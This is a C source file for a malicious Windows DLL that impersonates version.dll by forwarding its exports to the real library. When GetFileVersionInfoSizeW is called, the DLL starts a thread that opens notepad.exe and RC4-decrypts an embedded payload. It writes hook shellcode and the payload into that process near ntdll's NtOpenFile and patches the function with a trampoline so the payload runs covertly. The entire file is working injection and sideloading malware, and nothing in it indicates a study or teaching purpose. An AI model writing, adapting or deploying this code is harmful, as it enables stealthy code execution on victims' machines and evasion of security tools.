#include <Windows.h>
#include <tlhelp32.h>
#include "header.h"
#include "shellcode.h"

#define TARGET_FUNC "NtOpenFile"
#define TARGET_DLL L"ntdll.dll"

#pragma comment(linker,"/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.dll.GetFileVersionInfoA")
#pragma comment(linker,"/export:GetFileVersionInfoByHandle=C:\\Windows\\System32\\version.dll.GetFileVersionInfoByHandle")
#pragma comment(linker,"/export:GetFileVersionInfoExA=C:\\Windows\\System32\\version.dll.GetFileVersionInfoExA")
#pragma comment(linker,"/export:GetFileVersionInfoExW=C:\\Windows\\System32\\version.dll.GetFileVersionInfoExW")
#pragma comment(linker,"/export:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeA")
#pragma comment(linker,"/export:GetFileVersionInfoSizeExA=C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeExA")
#pragma comment(linker,"/export:GetFileVersionInfoSizeExW=C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeExW")
#pragma comment(linker,"/export:GetFileVersionInfoSizeW=GetFileVersionInfoSizeWfwd")
#pragma comment(linker,"/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.dll.GetFileVersionInfoW")
#pragma comment(linker,"/export:VerFindFileA=C:\\Windows\\System32\\version.dll.VerFindFileA")
#pragma comment(linker,"/export:VerFindFileW=C:\\Windows\\System32\\version.dll.VerFindFileW")
#pragma comment(linker,"/export:VerInstallFileA=C:\\Windows\\System32\\version.dll.VerInstallFileA")
#pragma comment(linker,"/export:VerInstallFileW=C:\\Windows\\System32\\version.dll.VerInstallFileW")
#pragma comment(linker,"/export:VerLanguageNameA=C:\\Windows\\System32\\version.dll.VerLanguageNameA")
#pragma comment(linker,"/export:VerLanguageNameW=C:\\Windows\\System32\\version.dll.VerLanguageNameW")
#pragma comment(linker,"/export:VerQueryValueA=C:\\Windows\\System32\\version.dll.VerQueryValueA")
#pragma comment(linker,"/export:VerQueryValueW=C:\\Windows\\System32\\version.dll.VerQueryValueW")

typedef struct _NT_API_FP
{
	fnNtAllocateVirtualMemory pNtAllocateVirtualMemory;
	fnNtWriteVirtualMemory pNtWriteVirtualMemory;
	fnNtProtectVirtualMemory pNtProtectVirtualMemory;

} NT_API_FP, * PNT_API_FP;

NT_API_FP g_NtApi = { 0x00 };

void rc4_init(unsigned char* S, unsigned char* key, size_t keyLen) {

	for (int i = 0; i < 256; i++)
		S[i] = (unsigned char)i;

	int j = 0;
	for (int i = 0; i < 256; i++) {
		j = (j + S[i] + key[i % keyLen]) % 256;

		// swap
		unsigned char tmp = S[i];
		S[i] = S[j];
		S[j] = tmp;
	}
}

void rc4_crypt(unsigned char* S, unsigned char* data, size_t dataLen) {

	int i = 0, j = 0;

	for (size_t n = 0; n < dataLen; n++) {
		i = (i + 1) % 256;
		j = (j + S[i]) % 256;

		// swap
		unsigned char tmp = S[i];
		S[i] = S[j];
		S[j] = tmp;

		// XOR con keystream
		data[n] ^= S[(S[i] + S[j]) % 256];
	}
}

BOOL InitNtApiTable(PNT_API_FP pTable) {

	if (!pTable)
		return FALSE;

	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
	if (!hNtdll)
		return FALSE;

	pTable->pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

	pTable->pNtWriteVirtualMemory = (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");

	pTable->pNtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");

	if (!pTable->pNtAllocateVirtualMemory || !pTable->pNtWriteVirtualMemory || !pTable->pNtProtectVirtualMemory)
	{
		return FALSE;
	}

	return TRUE;
}

BOOL FindMemoryHole(HANDLE hProcess, ULONG_PTR* puAddress, ULONG_PTR uExportedFuncAddress, SIZE_T sPayloadSize) {

	NTSTATUS STATUS = STATUS_SUCCESS;

	ULONG_PTR uAddress = NULL;

	SIZE_T sTmpSizeVar = sPayloadSize;

	for (uAddress = (uExportedFuncAddress & 0xFFFFFFFFFFF70000) - 0x70000000; uAddress < uExportedFuncAddress + 0x70000000; uAddress += 0x10000) {

		if (!NT_SUCCESS((STATUS = g_NtApi.pNtAllocateVirtualMemory(hProcess, &uAddress, 0x00, &sTmpSizeVar, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))) {
			continue;
		}

		*puAddress = uAddress;
		break;
	}

	return *puAddress ? TRUE : FALSE;
}

BOOL PatchFuncAndInstallTrampoline(HANDLE hProcess, PVOID pAddressOfExportedFunc, PVOID pMainPayloadAddress) {

	NTSTATUS STATUS = STATUS_SUCCESS;

	DWORD dwOlProtection = 0x00;

	unsigned char uTrampoline[0x05] = { 0xE8, 0x00, 0x00, 0x00, 0x00 };

	unsigned long ullRVA = (unsigned long)((ULONG_PTR)pMainPayloadAddress - ((ULONG_PTR)pAddressOfExportedFunc + sizeof(uTrampoline)));

	SIZE_T sTmpSizeVar = sizeof(uTrampoline);
	SIZE_T sBytesWritten = 0x00;

	PVOID pTmpAddress = pAddressOfExportedFunc;

	memcpy(&uTrampoline[1], &ullRVA, sizeof(ullRVA));

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtProtectVirtualMemory(hProcess, &pTmpAddress, &sTmpSizeVar, PAGE_READWRITE, &dwOlProtection)))) {
		return FALSE;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, pAddressOfExportedFunc, uTrampoline, sizeof(uTrampoline), &sBytesWritten))) | sBytesWritten != sizeof(uTrampoline)) {
		return FALSE;
	}

	sTmpSizeVar = sizeof(uTrampoline);
	pTmpAddress = pAddressOfExportedFunc;

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtProtectVirtualMemory(hProcess, &pTmpAddress, &sTmpSizeVar, PAGE_EXECUTE_READWRITE, &dwOlProtection)))) {
		return FALSE;
	}

	return TRUE;
}

unsigned char g_HookShellcode[56] = {
		0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
		0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
		0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
		0xE0, 0x90
};

VOID PatchHookShellcode(PVOID pAddressOfExportedFunc) {

	unsigned long long ullOriginalBytes = *(unsigned long long*)pAddressOfExportedFunc;

	memcpy(&g_HookShellcode[18], &ullOriginalBytes, sizeof(ullOriginalBytes));
}

BOOL WritePayloadBuffer(HANDLE hProcess, ULONG_PTR uAddress, ULONG_PTR uHookShellcode, SIZE_T sHookShellcodeSize, ULONG_PTR uPayloadBuffer, SIZE_T sPayloadSize) {

	SIZE_T sTmpSizeVar = sPayloadSize;
	SIZE_T sBytesWritten = 0x00;
	DWORD dwOlProtection = 0x00;
	NTSTATUS STATUS = STATUS_SUCCESS;

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, uAddress, uHookShellcode, sHookShellcodeSize, &sBytesWritten))) | sBytesWritten != sHookShellcodeSize) {
		return FALSE;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, (uAddress + sBytesWritten), uPayloadBuffer, sPayloadSize, &sBytesWritten))) | sBytesWritten != sPayloadSize) {
		return FALSE;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtProtectVirtualMemory(hProcess, &uAddress, &sTmpSizeVar, PAGE_EXECUTE_READWRITE, &dwOlProtection)))) {
		return FALSE;
	}

	return TRUE;
}

DWORD GetTargetPid(LPCWSTR pwszProcessName) {

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	PROCESSENTRY32W pe32 = { .dwSize = sizeof(PROCESSENTRY32W) };

	if (Process32FirstW(hSnapshot, &pe32)) {
		do {
			if (lstrcmpiW(pe32.szExeFile, pwszProcessName) == 0) {
				CloseHandle(hSnapshot);
				return pe32.th32ProcessID;
			}
		} while (Process32NextW(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);
	return 0;
}

typedef DWORD(WINAPI* fnGetFileVersionInfoSizeW)(LPCWSTR lptstrFilename, LPDWORD lpdwHandle);

DWORD WINAPI InjectionThread(LPVOID lpParam) {

	ULONG_PTR uAddress = NULL;
	PVOID pExportedFuncAddr = NULL;
	HANDLE hProcess = NULL;
	DWORD dwTargetPid = 0;

	unsigned char S[256] = { 0 };

	if (!InitNtApiTable(&g_NtApi))
		return 1;

	dwTargetPid = GetTargetPid(L"notepad.exe");
	if (!dwTargetPid)
		return 1;

	pExportedFuncAddr = GetProcAddress(LoadLibraryW(TARGET_DLL), TARGET_FUNC);
	if (!pExportedFuncAddr)
		return 1;

	PatchHookShellcode(pExportedFuncAddr);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTargetPid);
	if (!hProcess)
		return 1;

	rc4_init(S, key, sizeof(key));
	rc4_crypt(S, payload, sizeof(payload));

	if (!FindMemoryHole(hProcess, &uAddress, pExportedFuncAddr, sizeof(payload) + sizeof(g_HookShellcode)))
		return 1;

	if (!WritePayloadBuffer(hProcess, uAddress, g_HookShellcode, sizeof(g_HookShellcode), payload, sizeof(payload)))
		return 1;

	if (!PatchFuncAndInstallTrampoline(hProcess, pExportedFuncAddr, (PVOID)uAddress))
		return 1;

	CloseHandle(hProcess);
	return 0;
}

extern __declspec(dllexport) BOOL GetFileVersionInfoSizeWfwd(LPCWSTR lptstrFilename, LPDWORD lpdwHandle) {

    HANDLE hModule = NULL;
    fnGetFileVersionInfoSizeW pGetFileVersionInfoSizeW = NULL;

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)InjectionThread, NULL, 0, NULL);

    hModule = LoadLibrary(L"C:\\Windows\\System32\\version.dll");

    pGetFileVersionInfoSizeW = (fnGetFileVersionInfoSizeW)GetProcAddress(hModule, "GetFileVersionInfoSizeW");

    return pGetFileVersionInfoSizeW(lptstrFilename, lpdwHandle);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

